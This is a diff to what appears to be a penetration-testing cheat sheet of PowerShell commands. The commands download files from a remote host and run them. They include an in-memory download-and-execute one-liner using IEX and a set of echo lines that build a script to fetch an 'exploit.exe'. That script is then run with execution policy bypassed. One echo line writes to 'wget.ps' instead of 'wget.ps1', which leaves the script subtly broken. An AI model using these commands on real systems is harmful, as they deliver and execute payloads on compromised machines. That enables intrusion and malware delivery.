@@ -6,4 +6,16 @@ Invoke-WebRequest "http://<ip:port>file to get>" -OutFile "C:\Users\administrato
 (New-Object System.Net.WebClient).DownloadFile("http://<ip:port>/<file to get>", "C:\Windows\Temp\<what to save file as>")
 
 // Download and execute without saving on disk
-powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.1.2/test.ps1') 
+
+powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.1.2/test.ps1')
+
+// powershell non-interactive file transfer 
+echo $storageDir = $pwd > wget.ps1
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://192.168.1.2/exploit.exe" >>wget.ps1
+echo $file = "exploit1-ouput.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps
+
+// Finally we can call and run the ps file using below
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+
